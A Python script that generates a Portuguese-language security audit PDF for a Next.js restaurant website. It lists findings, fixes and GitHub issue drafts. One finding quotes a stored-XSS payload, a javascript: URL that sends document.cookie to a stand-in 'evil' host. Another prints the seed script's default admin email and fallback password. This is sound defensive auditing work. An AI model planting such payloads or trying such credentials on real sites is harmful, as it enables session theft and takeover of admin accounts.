# -*- coding: utf-8 -*-
"""
Gera o relatório de auditoria de segurança em PDF.

Uso:
    docs/security-audit/.venv/Scripts/python.exe docs/security-audit/gerar_relatorio.py

Regenera docs/security-audit/relatorio-auditoria-seguranca.pdf a partir dos
achados abaixo. Edite a lista FINDINGS (e os textos de contexto) pra manter o
relatório atualizado em auditorias futuras.
"""
import os
import textwrap
from datetime import date

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import cm
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image,
    PageBreak, KeepTogether, HRFlowable, Frame, NextPageTemplate, PageTemplate,
)
from reportlab.pdfgen import canvas as pdfcanvas

HERE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(HERE, "assets")
os.makedirs(ASSETS, exist_ok=True)
OUTPUT_PDF = os.path.join(HERE, "relatorio-auditoria-seguranca.pdf")

PROJECT_NAME = "Delírio Tropical (delirio-restaurante)"
REPO = "tiagomagno/delirio-restaurante"
AUDIT_DATE = date.today().strftime("%d/%m/%Y")

# ─────────────────────────────────────────────────────────────────────────
# Paleta
# ─────────────────────────────────────────────────────────────────────────
SEV_COLORS = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "informativa": "#6B7280",
}
STRONG_COLOR = "#059669"
SEV_LABELS = {
    "critica": "Crítica",
    "alta": "Alta",
    "media": "Média",
    "baixa": "Baixa",
    "informativa": "Informativa",
}
SEV_ORDER = ["critica", "alta", "media", "baixa", "informativa"]

DARK = "#111827"
MUTED = "#6B7280"
LIGHT_BG = "#F3F4F6"

# ─────────────────────────────────────────────────────────────────────────
# Nota metodológica — stack detectada
# ─────────────────────────────────────────────────────────────────────────
STACK_NOTE = """
<b>Stack detectada:</b> Next.js 15.5.25 (App Router, TypeScript), React 19, Prisma 6 ORM
sobre MySQL, autenticação própria via cookie httpOnly + JWT (biblioteca <i>jose</i>,
HS256) validado em <font face="Courier">lib/session.ts</font> /
<font face="Courier">lib/session-edge.ts</font>, senhas com bcryptjs. Frontend: React
Server/Client Components, sem framework de UI adicional. Deploy: Docker
(<font face="Courier">Dockerfile</font> multi-estágio) publicado num VPS via EasyPanel;
sem pipeline de CI/CD no repositório (nenhum diretório <font face="Courier">.github/workflows</font>)
e sem docker-compose/Helm/Terraform.
<br/><br/>
<b>Mapeamento das categorias pra essa stack:</b>
<br/>• <b>Isolamento de inquilino/dono</b> → o projeto não é multitenant: não existe RLS (não é
Supabase/Postgres com políticas), nem middleware de tenant, nem <font face="Courier">org_id</font>/
<font face="Courier">tenant_id</font> em nenhum modelo do schema Prisma. Existe um único nível de
usuário (<font face="Courier">AdminUser</font>), sem papel/permissão diferenciada, e os dados
(lojas, banner, textos) são globais ao site — não há "dado de outro usuário" a isolar. A
categoria foi então auditada como: presença e consistência da checagem de sessão
(<font face="Courier">getSession()</font>) em toda rota que lê ou grava dado administrativo.
<br/>• <b>Permissão definida no navegador</b> → mapeada para: existência de gates de papel no
frontend (ex.: <font face="Courier">isAdmin</font>, <font face="Courier">canEdit</font>) e, para
cada um encontrado, se o backend valida o mesmo privilégio.
<br/>• <b>IDOR</b> → mapeada para: todo handler de rota (Route Handler do App Router) que recebe um
ID por path/query/body e busca/altera/deleta um registro via Prisma, verificando se a posse é
checada além da autenticação.
<br/>• <b>Chaves expostas</b> → variáveis de ambiente (<font face="Courier">process.env.*</font>),
<font face="Courier">.env.example</font>, <font face="Courier">Dockerfile</font>, scripts em
<font face="Courier">scripts/</font> e <font face="Courier">prisma/seed.mjs</font>, histórico do
Git e bundle de cliente (variáveis <font face="Courier">NEXT_PUBLIC_*</font>).
<br/>• <b>XSS / input sem tratamento</b> → uso de <font face="Courier">dangerouslySetInnerHTML</font>
(equivalente React ao <font face="Courier">innerHTML</font>), URLs controladas por admin
renderizadas em <font face="Courier">href</font>, e geração de e-mail HTML (via Nodemailer) a
partir de campos de formulário público.
"""

SCOPE_NOTE = (
    "Todo o código-fonte da aplicação (app/, components/, lib/, prisma/), configuração de "
    "build e deploy (Dockerfile, next.config.ts, middleware.ts, package.json), variáveis de "
    "ambiente de exemplo (.env.example) e histórico completo do Git. Não incluiu teste de "
    "penetração contra o ambiente de produção nem revisão de infraestrutura do EasyPanel/VPS."
)

# ─────────────────────────────────────────────────────────────────────────
# Achados
# ─────────────────────────────────────────────────────────────────────────
# category: "1_tenant" | "2_browser_perm" | "3_idor" | "4_secrets" | "5_xss" | "6_extra"
FINDINGS = [
    {
        "id": "H1",
        "category": "4_secrets",
        "severity": "alta",
        "title": "Senha padrão fraca e pública no seed do admin, sem validação de startup",
        "file": "prisma/seed.mjs",
        "lines": "354-355",
        "snippet": (
            "const email = (process.env.ADMIN_SEED_EMAIL || 'admin@delirio.com.br').toLowerCase().trim()\n"
            "const password = process.env.ADMIN_SEED_PASSWORD || 'troque-esta-senha'"
        ),
        "why": (
            "Se a variável ADMIN_SEED_PASSWORD não estiver definida no ambiente onde o seed roda "
            "(erro de configuração, ambiente novo, nome de variável digitado errado no painel do "
            "EasyPanel), o script cria silenciosamente um admin com e-mail e senha previsíveis, "
            "ambos visíveis em texto puro neste arquivo público no GitHub. Não há nenhuma checagem "
            "que impeça o processo de seguir adiante com esse default — o script apenas loga "
            "\"Admin criado\" e continua."
        ),
        "impact": (
            "Login administrativo completo (criar/editar/excluir lojas, banner, textos do site, "
            "outros usuários admin) com credenciais conhecidas por qualquer pessoa que leia o "
            "repositório."
        ),
        "fix": (
            "Fazer o script falhar (process.exit(1)) se ADMIN_SEED_PASSWORD não estiver definida "
            "em produção (NODE_ENV=production), em vez de usar o fallback. Trocar a senha de "
            "qualquer admin que já tenha sido criado com o valor default."
        ),
        "exploit_conditions": "Requer que ADMIN_SEED_PASSWORD não tenha sido configurada (ou tenha sido apagada) no ambiente onde `npm run db:seed` / `postinstall` roda.",
    },
    {
        "id": "H2",
        "category": "5_xss",
        "severity": "media",
        "title": "URLs de loja (mapsUrl/deliveryUrl/menuUrl) sem validação de esquema, renderizadas em href",
        "file": "app/api/admin/stores/route.ts",
        "lines": "36-38",
        "snippet": (
            "mapsUrl: body.mapsUrl,\n"
            "deliveryUrl: body.deliveryUrl || null,\n"
            "menuUrl: body.menuUrl || null,"
        ),
        "why": (
            "Nenhuma das rotas de criação/edição de loja valida o formato ou o esquema dessas "
            "URLs (diferente de meta.canonical, que em lib/seo/fieldCheck.ts:29-37 exige "
            "explicitamente http:/https:). Um valor como \"javascript:fetch('https://evil/'+document.cookie)\" "
            "é salvo sem erro e depois renderizado direto em atributos href em 7 pontos do site "
            "público, sem nenhuma sanitização de esquema:<br/>"
            "&nbsp;&nbsp;• components/StoreCarousel.tsx:111, :121, :131<br/>"
            "&nbsp;&nbsp;• components/CardapioModal.tsx:44<br/>"
            "&nbsp;&nbsp;• app/(site)/lojas/LojasClient.tsx:112, :116, :121<br/>"
            "A mesma ausência de validação existe em app/api/admin/stores/[id]/route.ts:5-10 "
            "(EDITABLE_FIELDS inclui mapsUrl/deliveryUrl/menuUrl sem checagem de formato)."
        ),
        "impact": (
            "Requer uma conta de admin (já legítima ou comprometida) para plantar o valor — mas o "
            "resultado é um link malicioso servido a QUALQUER visitante do site público que clicar "
            "em \"Como chegar\", \"Delivery\" ou \"Ver cardápio\", escalando de um admin "
            "comprometido para potencialmente todos os visitantes do site."
        ),
        "fix": (
            "Reaproveitar a mesma validação já usada em meta.canonical (new URL(value) + checar "
            "protocol === 'http:' || 'https:') nos três campos, tanto na criação (route.ts) quanto "
            "na edição ([id]/route.ts), rejeitando qualquer esquema diferente de http(s)."
        ),
        "exploit_conditions": "Requer uma sessão de admin válida (própria ou comprometida) para gravar o valor malicioso; depois disso, a exploração contra visitantes é automática.",
    },
    {
        "id": "H3",
        "category": "6_extra",
        "severity": "media",
        "title": "Upload público de currículo confia só no Content-Type declarado pelo cliente",
        "file": "app/api/trabalhe-conosco/route.ts",
        "lines": "10-14, 36-37, 46-50",
        "snippet": (
            "const ALLOWED_TYPES: Record<string, string> = {\n"
            "  'application/pdf': '.pdf', 'application/msword': '.doc',\n"
            "  '...wordprocessingml.document': '.docx',\n"
            "}\n"
            "...\n"
            "const ext = ALLOWED_TYPES[curriculo.type]\n"
            "...\n"
            "await writeFile(path.join(uploadDir, fileName), buffer)"
        ),
        "why": (
            "Esse endpoint é público (nenhum getSession()) e aceita upload de arquivo de qualquer "
            "visitante do site. A validação de tipo usa apenas curriculo.type — o Content-Type "
            "que o NAVEGADOR do próprio remetente declara na parte multipart, livremente "
            "forjável. O conteúdo real do arquivo nunca é verificado (nem magic bytes, nem "
            "reprocessamento), e o arquivo é salvo direto em public/uploads/curriculos/, uma "
            "pasta servida publicamente. Contraste com o upload do admin "
            "(app/api/admin/upload/route.ts), que reprocessa a imagem com sharp — isso decodifica "
            "de verdade o arquivo e falha se o conteúdo não for uma imagem válida; o upload de "
            "currículo não tem esse equivalente."
        ),
        "impact": (
            "A extensão final é sempre .pdf/.doc/.docx (definida pela tabela, não pelo cliente), "
            "então não dá pra forçar uma extensão executável — mas um arquivo .doc/.docx com "
            "macro maliciosa, ou um PDF malformado explorando o leitor de PDF de quem abre, pode "
            "ser hospedado no domínio da empresa e distribuído para quem administra "
            "/admin/candidaturas ao baixar o currículo, sem qualquer verificação de conteúdo."
        ),
        "fix": (
            "Validar o conteúdo real do arquivo por assinatura/magic bytes (ex.: %PDF- pro PDF, "
            "assinatura ZIP/OLE pro .docx/.doc) antes de salvar, e considerar escanear o arquivo "
            "(antivírus/serviço externo) antes de disponibilizá-lo para download pelo admin."
        ),
        "exploit_conditions": "Nenhuma — endpoint público, sem autenticação, já em produção.",
    },
    {
        "id": "H4",
        "category": "6_extra",
        "severity": "baixa",
        "title": "Rotas GET de /api/admin/* sem checagem de sessão",
        "file": "app/api/admin/stores/route.ts:5-8 · app/api/admin/hero-slides/route.ts:5-7 · app/api/admin/content/route.ts:4-9",
        "lines": "",
        "snippet": (
            "// app/api/admin/stores/route.ts\n"
            "export async function GET() {\n"
            "  const stores = await prisma.store.findMany({ orderBy: { order: 'asc' } })\n"
            "  return NextResponse.json(stores)\n"
            "}"
        ),
        "why": (
            "Nas mesmas três rotas, o POST/PATCH exige getSession() (ex.: stores/route.ts:11), "
            "mas o GET não — inconsistência que sugere descuido, não intenção. Como o "
            "middleware.ts só protege /admin/:path* (páginas), não /api/admin/:path*, essas três "
            "rotas ficam de fato públicas: qualquer um pode chamar GET /api/admin/stores, "
            "GET /api/admin/hero-slides ou GET /api/admin/content sem login."
        ),
        "impact": (
            "Vaza registros que não deveriam ser públicos: lojas com active=false (removidas do "
            "site) e seus e-mails/telefones/destinatários extras, slides de banner inativos, e o "
            "conteúdo bruto de PageContent — informação estrutural do CMS que facilita "
            "reconhecimento para outros ataques."
        ),
        "fix": "Adicionar a mesma checagem `const session = await getSession(); if (!session) return 401` no início dos três handlers GET.",
        "exploit_conditions": "Nenhuma — rotas já acessíveis sem autenticação em produção.",
    },
    {
        "id": "H5",
        "category": "6_extra",
        "severity": "informativa",
        "title": "Upload de GIF no admin não passa pela validação real de imagem (sharp)",
        "file": "app/api/admin/upload/route.ts",
        "lines": "40-44",
        "snippet": (
            "if (file.type === 'image/gif') {\n"
            "  const fileName = `${randomUUID()}.gif`\n"
            "  await writeFile(path.join(uploadDir, fileName), originalBuffer)\n"
            "  return NextResponse.json({ url: `/uploads/${folder}/${fileName}` })\n"
            "}"
        ),
        "why": (
            "Para todo outro tipo de imagem, o buffer passa por sharp(...).webp(...), que decodifica "
            "o arquivo de verdade e falha se não for uma imagem válida (proteção real contra "
            "Content-Type forjado). O ramo de GIF pula essa etapa — o arquivo é gravado como veio, "
            "validado apenas pelo Content-Type declarado (também forjável)."
        ),
        "impact": (
            "Só explorável por quem já tem sessão de admin válida — um admin malicioso ou "
            "comprometido já teria meios mais diretos de causar dano (editar qualquer conteúdo do "
            "site). Risco marginal: hospedar um arquivo arbitrário com extensão .gif no domínio."
        ),
        "fix": "Validar a assinatura GIF (bytes 'GIF87a'/'GIF89a') antes de gravar, mesmo sem reprocessar a imagem.",
        "exploit_conditions": "Requer sessão de admin válida (própria ou comprometida) — não é um vetor não-autenticado.",
    },
]

# ─────────────────────────────────────────────────────────────────────────
# Pontos fortes (com evidência)
# ─────────────────────────────────────────────────────────────────────────
STRENGTHS = [
    ("Toda rota de escrita exige sessão", "Todas as 16 rotas de mutação (POST/PATCH/DELETE) sob app/api/admin/ chamam getSession() e retornam 401 antes de tocar no banco — verificado individualmente em auth/login, contact-messages/[id], content/[id], event-requests/[id], eventos-recipients, hero-slides (+[id]), job-applications/[id], ouvidoria-messages/[id], stores (+[id]), upload, users (+[id]). Nenhuma exceção encontrada."),
    ("Segredo de sessão sem fallback inseguro", "lib/session-edge.ts:6-10 — getSecretKey() lança erro (\"SESSION_SECRET não configurada\") se a variável de ambiente não existir, em vez de usar um valor padrão. A aplicação não sobe/autentica sem um segredo real definido."),
    ("Cookie de sessão configurado corretamente", "app/api/admin/auth/login/route.ts:22-28 — httpOnly (bloqueia leitura via JS/XSS), secure em produção, sameSite: 'lax' (mitiga CSRF cross-site em POST)."),
    ("Nenhum segredo commitado no histórico do Git", "git log --all --name-only mostra apenas .env.example versionado em toda a história do repositório; nunca houve .env/.env.local/.env.production commitado. .gitignore:9-14 exclui todos os padrões .env*."),
    ("Nenhuma chave hardcoded no código", "Busca ampla por padrões de api_key/secret/password/token/private_key com valor literal em todo .ts/.tsx/.mjs/.js/.json/.yml do projeto (exceto .env.example) não retornou nenhum resultado."),
    ("Nenhum segredo embutido no bundle do cliente", "Nenhuma variável NEXT_PUBLIC_* é usada no projeto — todo process.env.* fica restrito a arquivos server-only (rotas, lib/), confirmado por busca em todo .ts/.tsx."),
    ("dangerouslySetInnerHTML usado uma única vez, de forma segura", "components/StructuredData.tsx:1-19 é o único uso de dangerouslySetInnerHTML em todo o projeto — serializa JSON-LD com JSON.stringify e escapa o caractere &lt; explicitamente (linha 2), prevenindo fuga da tag &lt;script&gt;."),
    ("E-mails HTML escapam todo input do usuário", "lib/email/templates.ts:21-27 define escapeHtml() e aplica em greetingName, formTitle, intro, storeName e em cada label/value de detalhe (linhas 32, 37-38, 52, 57, 59, 66) antes de interpolar no HTML do e-mail de confirmação."),
    ("Conteúdo editável do admin renderizado sem interpretação de HTML", "Todo texto de PageContent consumido nas páginas públicas (app/(site)/*) passa por interpolação JSX padrão ({content['chave']}) ou pelo componente Multiline (components/Multiline.tsx, que só divide por quebra de linha e usa &lt;br/&gt;) — auto-escapado pelo React, sem nenhum sinal de innerHTML."),
    ("Upload de imagem do admin valida conteúdo real (exceto GIF, ver H5)", "app/api/admin/upload/route.ts:46 processa o buffer com sharp(...).webp(...), que decodifica a imagem de verdade e rejeita arquivos cujo conteúdo não seja uma imagem válida — mitiga Content-Type forjado para os formatos jpeg/png/webp."),
    ("Proteção contra autoexclusão e remoção do último admin", "app/api/admin/users/[id]/route.ts:32-39 impede que um admin exclua a própria conta ou que o último admin restante seja removido."),
    ("IDOR: nenhum vetor encontrado no modelo atual", "Percorridos sistematicamente todos os handlers de rota do backend (19 arquivos route.ts). Como o app é single-tenant e de usuário único (sem conceito de \"dado de outro usuário\"), a checagem de sessão já é a verificação de posse suficiente; nenhuma rota permite acessar/alterar/excluir um recurso pertencente logicamente a outra parte."),
]

WEAKNESSES_INTRO = (
    "O ponto central de risco é a superfície de confiança implícita: dados que entram sem "
    "validação de formato (URLs de loja) ou sem validação de conteúdo real (upload público de "
    "currículo, upload de GIF no admin), e um fallback de senha fraca que só não é um problema "
    "hoje porque a variável de ambiente correta está configurada em produção — mas não há nada "
    "no código que impeça essa proteção de \"cair\" silenciosamente."
)

RECOMMENDATIONS = [
    ("P1", "Fazer prisma/seed.mjs abortar (exit 1) se ADMIN_SEED_PASSWORD não estiver definida quando NODE_ENV=production, eliminando o fallback de senha pública.", "H1"),
    ("P1", "Validar esquema (http/https) de mapsUrl, deliveryUrl e menuUrl na criação e edição de loja, reaproveitando a validação já existente para meta.canonical.", "H2"),
    ("P2", "Validar o conteúdo real (magic bytes) dos arquivos aceitos em /api/trabalhe-conosco antes de gravar, já que é um endpoint público sem autenticação.", "H3"),
    ("P2", "Adicionar getSession() aos handlers GET de /api/admin/stores, /api/admin/hero-slides e /api/admin/content.", "H4"),
    ("P3", "Validar a assinatura de arquivo GIF antes de gravar no upload do admin, alinhando esse caminho com os demais formatos já validados via sharp.", "H5"),
]

# ─────────────────────────────────────────────────────────────────────────
# Issues pro GitHub (Markdown)
# ─────────────────────────────────────────────────────────────────────────
def issue_md(number, title, labels, body_md):
    return f"--- ISSUE {number} ---\n{body_md.strip()}\n--- FIM ISSUE {number} ---"

ISSUES_MD = []

ISSUES_MD.append(issue_md(1, "H1", ["security", "alta"], f"""
# [Segurança] Senha padrão fraca e pública no seed do admin, sem validação de startup

**Labels sugeridas:** `security`, `alta`

## Descrição do problema
`prisma/seed.mjs` cria o usuário administrador inicial usando `process.env.ADMIN_SEED_PASSWORD`,
mas cai para o literal `'troque-esta-senha'` se a variável não estiver definida — sem nenhuma
checagem que impeça isso de acontecer em produção. O mesmo vale para o e-mail
(`admin@delirio.com.br` como default). Ambos os valores estão em texto puro no repositório
público.

## Evidência
`prisma/seed.mjs:354-355`
```js
const email = (process.env.ADMIN_SEED_EMAIL || 'admin@delirio.com.br').toLowerCase().trim()
const password = process.env.ADMIN_SEED_PASSWORD || 'troque-esta-senha'
```

## Impacto
Se a variável de ambiente não estiver configurada (erro de configuração, novo ambiente, nome
digitado errado no painel), o script cria silenciosamente uma conta de admin com credenciais
públicas e previsíveis — acesso administrativo completo ao site.

## Sugestão de correção
Fazer o script abortar (`process.exit(1)`) em vez de usar o fallback quando
`NODE_ENV === 'production'` e `ADMIN_SEED_PASSWORD` não estiver definida. Revisar se algum admin
já ativo foi criado com o valor default e trocar a senha se sim.

## Critérios de aceite
- [ ] `prisma/seed.mjs` lança erro e encerra o processo se `ADMIN_SEED_PASSWORD` estiver ausente
      em produção, sem criar o usuário com senha default
- [ ] Comportamento em desenvolvimento (sem a variável) continua funcional, com aviso claro no
      console
- [ ] Confirmado (manualmente) que nenhuma conta ativa em produção usa a senha default
"""))

ISSUES_MD.append(issue_md(2, "H2", ["security", "media"], f"""
# [Segurança] URLs de loja sem validação de esquema permitem link malicioso (javascript:) no site público

**Labels sugeridas:** `security`, `media`

## Descrição do problema
Os campos `mapsUrl`, `deliveryUrl` e `menuUrl` de cada loja são salvos sem validar formato ou
esquema, e depois renderizados diretamente em atributos `href` no site público. Um valor como
`javascript:...` passa sem erro pela API e fica ativo em qualquer card/carrossel de loja.

## Evidência
`app/api/admin/stores/route.ts:36-38` (criação) e `app/api/admin/stores/[id]/route.ts:5-10`
(edição, via `EDITABLE_FIELDS`) — nenhuma validação de esquema.

Pontos de renderização sem sanitização:
- `components/StoreCarousel.tsx:111`, `:121`, `:131`
- `components/CardapioModal.tsx:44`
- `app/(site)/lojas/LojasClient.tsx:112`, `:116`, `:121`

Contraste: `meta.canonical` já valida isso corretamente em `lib/seo/fieldCheck.ts:29-37`
(`new URL(value)` + checagem de `protocol`).

## Impacto
Requer uma sessão de admin (própria ou comprometida) para gravar o valor, mas a partir daí
qualquer visitante do site que clicar em "Como chegar", "Delivery" ou "Ver cardápio" executa o
payload — escalando de um admin comprometido para os visitantes públicos do site.

## Sugestão de correção
Reaplicar a mesma validação de `meta.canonical` (protocolo `http:`/`https:` obrigatório) aos três
campos, tanto na criação quanto na edição de loja.

## Critérios de aceite
- [ ] `POST /api/admin/stores` rejeita `mapsUrl`/`deliveryUrl`/`menuUrl` com esquema diferente de
      http/https
- [ ] `PATCH /api/admin/stores/[id]` idem
- [ ] Teste manual: salvar `javascript:alert(1)` em qualquer um dos três campos retorna erro de
      validação
"""))

ISSUES_MD.append(issue_md(3, "H3", ["security", "media"], f"""
# [Segurança] Upload público de currículo confia só no Content-Type declarado pelo navegador

**Labels sugeridas:** `security`, `media`

## Descrição do problema
`POST /api/trabalhe-conosco` é um endpoint público (sem autenticação) que aceita upload de
arquivo. A validação de tipo usa apenas o `Content-Type` que o próprio navegador do remetente
declara na parte multipart — livremente forjável — e o conteúdo real do arquivo nunca é
verificado antes de gravar em `public/uploads/curriculos/` (pasta servida publicamente).

## Evidência
`app/api/trabalhe-conosco/route.ts:10-14, 36-37, 46-50`
```js
const ALLOWED_TYPES: Record<string, string> = {{
  'application/pdf': '.pdf', 'application/msword': '.doc',
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
}}
...
const ext = ALLOWED_TYPES[curriculo.type]
...
await writeFile(path.join(uploadDir, fileName), buffer)
```

## Impacto
A extensão final é sempre controlada pelo servidor (`.pdf`/`.doc`/`.docx`), então não dá pra
forçar uma extensão executável — mas um `.doc`/`.docx` com macro maliciosa, ou um PDF malformado
visando o leitor de quem abre, pode ser hospedado no domínio da empresa e chega direto pra quem
administra `/admin/candidaturas`, sem qualquer verificação de conteúdo.

## Sugestão de correção
Validar a assinatura real do arquivo (magic bytes — `%PDF-` para PDF, assinatura OLE/ZIP para
`.doc`/`.docx`) antes de gravar. Considerar escaneamento (antivírus/serviço externo) antes de
disponibilizar o arquivo para download pelo admin.

## Critérios de aceite
- [ ] Upload com `Content-Type` forjado mas conteúdo que não corresponde à assinatura esperada é
      rejeitado
- [ ] Testes cobrindo PDF, DOC e DOCX válidos continuam passando
"""))

ISSUES_MD.append(issue_md(4, "H4", ["security", "baixa"], f"""
# [Segurança] Rotas GET de /api/admin/* sem checagem de sessão (stores, hero-slides, content)

**Labels sugeridas:** `security`, `baixa`

## Descrição do problema
`GET /api/admin/stores`, `GET /api/admin/hero-slides` e `GET /api/admin/content` não chamam
`getSession()`, ao contrário dos handlers POST/PATCH nos mesmos arquivos. Como
`middleware.ts` só protege páginas (`/admin/:path*`), não rotas de API, essas três ficam
publicamente acessíveis sem login.

## Evidência
`app/api/admin/stores/route.ts:5-8`
```js
export async function GET() {{
  const stores = await prisma.store.findMany({{ orderBy: {{ order: 'asc' }} }})
  return NextResponse.json(stores)
}}
```
Mesmo padrão em `app/api/admin/hero-slides/route.ts:5-7` e `app/api/admin/content/route.ts:4-9`.

## Impacto
Vaza lojas inativas (removidas do site público) com e-mail/telefone/destinatários extras, slides
de banner inativos e o conteúdo bruto de `PageContent` — informação que não deveria ser pública e
que facilita reconhecimento para outros ataques.

## Sugestão de correção
Adicionar a mesma checagem de sessão usada nos handlers POST/PATCH dos mesmos arquivos ao início
de cada GET.

## Critérios de aceite
- [ ] `GET /api/admin/stores`, `/api/admin/hero-slides` e `/api/admin/content` retornam 401 sem
      cookie de sessão válido
- [ ] Páginas do admin que consomem esses endpoints continuam funcionando normalmente autenticado
"""))

ISSUES_MD.append(issue_md(5, "H5", ["security", "informativa"], f"""
# [Segurança] Upload de GIF no admin não passa pela validação real de imagem

**Labels sugeridas:** `security`, `informativa`

## Descrição do problema
No upload de imagens do admin, todo formato exceto GIF é reprocessado via
`sharp(...).webp(...)`, o que decodifica o arquivo de verdade e rejeita conteúdo que não seja uma
imagem válida. O ramo de GIF pula essa etapa e grava o buffer recebido sem validar a assinatura
do arquivo — só o `Content-Type` declarado (forjável) é checado.

## Evidência
`app/api/admin/upload/route.ts:40-44`
```js
if (file.type === 'image/gif') {{
  const fileName = `${{randomUUID()}}.gif`
  await writeFile(path.join(uploadDir, fileName), originalBuffer)
  return NextResponse.json({{ url: `/uploads/${{folder}}/${{fileName}}` }})
}}
```

## Impacto
Só explorável por quem já tem sessão de admin válida — nesse caso já haveria meios mais diretos
de causar dano. Risco marginal: hospedar um arquivo arbitrário com extensão `.gif` no domínio.

## Sugestão de correção
Validar a assinatura GIF (`GIF87a`/`GIF89a` nos primeiros bytes) antes de gravar, mesmo sem
reprocessar a imagem.

## Critérios de aceite
- [ ] Upload de um arquivo não-GIF disfarçado de `image/gif` é rejeitado
- [ ] GIFs válidos (incluindo animados) continuam sendo aceitos sem alteração de comportamento
"""))

# ─────────────────────────────────────────────────────────────────────────
# Gráficos
# ─────────────────────────────────────────────────────────────────────────
def make_donut_chart():
    counts = {s: 0 for s in SEV_ORDER}
    for f in FINDINGS:
        counts[f["severity"]] += 1
    labels, sizes, colors_ = [], [], []
    for s in SEV_ORDER:
        if counts[s] > 0:
            labels.append(f"{SEV_LABELS[s]} ({counts[s]})")
            sizes.append(counts[s])
            colors_.append(SEV_COLORS[s])

    fig, ax = plt.subplots(figsize=(4.6, 4.0), dpi=200)
    wedges, _ = ax.pie(
        sizes, colors=colors_, startangle=90, counterclock=False,
        wedgeprops=dict(width=0.42, edgecolor="white", linewidth=2),
    )
    ax.text(0, 0.08, str(sum(sizes)), ha="center", va="center", fontsize=26, fontweight="bold", color=DARK)
    ax.text(0, -0.18, "achados", ha="center", va="center", fontsize=11, color=MUTED)
    ax.legend(wedges, labels, loc="center left", bbox_to_anchor=(1.02, 0.5), frameon=False, fontsize=10)
    ax.set_aspect("equal")
    fig.tight_layout()
    path = os.path.join(ASSETS, "donut_severidade.png")
    fig.savefig(path, transparent=True, bbox_inches="tight")
    plt.close(fig)
    return path


def make_bar_chart():
    cat_labels = {
        "1_tenant": "Isolamento\nde tenant",
        "2_browser_perm": "Permissão\nno navegador",
        "3_idor": "IDOR",
        "4_secrets": "Chaves\nexpostas",
        "5_xss": "XSS / Input\nsem tratamento",
        "6_extra": "Achados\nadicionais",
    }
    order = ["1_tenant", "2_browser_perm", "3_idor", "4_secrets", "5_xss", "6_extra"]
    counts = {c: 0 for c in order}
    worst = {c: None for c in order}
    sev_rank = {s: i for i, s in enumerate(SEV_ORDER)}
    for f in FINDINGS:
        counts[f["category"]] += 1
        cur = worst[f["category"]]
        if cur is None or sev_rank[f["severity"]] < sev_rank[cur]:
            worst[f["category"]] = f["severity"]

    labels = [cat_labels[c] for c in order]
    values = [counts[c] for c in order]
    bar_colors = [SEV_COLORS[worst[c]] if worst[c] else STRONG_COLOR for c in order]

    fig, ax = plt.subplots(figsize=(7.6, 3.6), dpi=200)
    bars = ax.bar(labels, values, color=bar_colors, width=0.55, zorder=3)
    for b, v in zip(bars, values):
        label = str(v) if v > 0 else "0"
        ax.text(b.get_x() + b.get_width() / 2, b.get_height() + 0.05, label,
                 ha="center", va="bottom", fontsize=10, fontweight="bold", color=DARK)
    ax.set_ylim(0, max(values + [1]) + 1)
    ax.set_yticks(range(0, max(values + [1]) + 2))
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.spines["left"].set_color("#D1D5DB")
    ax.spines["bottom"].set_color("#D1D5DB")
    ax.tick_params(axis="x", labelsize=9, colors=DARK)
    ax.tick_params(axis="y", labelsize=9, colors=MUTED)
    ax.yaxis.grid(True, color="#E5E7EB", zorder=0)
    ax.set_axisbelow(True)
    fig.tight_layout()
    path = os.path.join(ASSETS, "barras_categoria.png")
    fig.savefig(path, transparent=True, bbox_inches="tight")
    plt.close(fig)
    return path


# ─────────────────────────────────────────────────────────────────────────
# PDF
# ─────────────────────────────────────────────────────────────────────────
PAGE_W, PAGE_H = A4
MARGIN = 2 * cm
REPORT_TITLE = f"Relatório de Auditoria de Segurança — {PROJECT_NAME}"


def header_footer(canvas_obj: pdfcanvas.Canvas, doc):
    canvas_obj.saveState()
    canvas_obj.setFont("Helvetica", 8)
    canvas_obj.setFillColor(colors.HexColor(MUTED))
    canvas_obj.drawString(MARGIN, PAGE_H - 1.3 * cm, REPORT_TITLE)
    canvas_obj.drawRightString(PAGE_W - MARGIN, PAGE_H - 1.3 * cm, AUDIT_DATE)
    canvas_obj.setStrokeColor(colors.HexColor("#E5E7EB"))
    canvas_obj.line(MARGIN, PAGE_H - 1.45 * cm, PAGE_W - MARGIN, PAGE_H - 1.45 * cm)

    canvas_obj.line(MARGIN, 1.4 * cm, PAGE_W - MARGIN, 1.4 * cm)
    canvas_obj.drawString(MARGIN, 1.0 * cm, "Confidencial — uso interno")
    canvas_obj.drawRightString(PAGE_W - MARGIN, 1.0 * cm, f"Página {doc.page}")
    canvas_obj.restoreState()


def cover_page(canvas_obj: pdfcanvas.Canvas, doc):
    canvas_obj.saveState()
    canvas_obj.setFillColor(colors.HexColor(DARK))
    canvas_obj.rect(0, PAGE_H - 7.5 * cm, PAGE_W, 7.5 * cm, fill=1, stroke=0)
    canvas_obj.setFillColor(colors.HexColor("#059669"))
    canvas_obj.rect(0, PAGE_H - 7.6 * cm, PAGE_W, 0.12 * cm, fill=1, stroke=0)

    canvas_obj.setFillColor(colors.white)
    canvas_obj.setFont("Helvetica-Bold", 15)
    canvas_obj.drawString(MARGIN, PAGE_H - 2.6 * cm, "RELATÓRIO DE AUDITORIA DE SEGURANÇA")
    canvas_obj.setFont("Helvetica-Bold", 26)
    title_lines = textwrap.wrap(PROJECT_NAME, 34)
    y = PAGE_H - 4.2 * cm
    for line in title_lines:
        canvas_obj.drawString(MARGIN, y, line)
        y -= 1.05 * cm
    canvas_obj.setFont("Helvetica", 12)
    canvas_obj.setFillColor(colors.HexColor("#D1D5DB"))
    canvas_obj.drawString(MARGIN, y - 0.3 * cm, f"Repositório: {REPO}")
    canvas_obj.drawString(MARGIN, y - 0.95 * cm, f"Data da auditoria: {AUDIT_DATE}")
    canvas_obj.restoreState()


styles = getSampleStyleSheet()
styles.add(ParagraphStyle(name="H1c", fontName="Helvetica-Bold", fontSize=17, textColor=colors.HexColor(DARK), spaceAfter=10, spaceBefore=4))
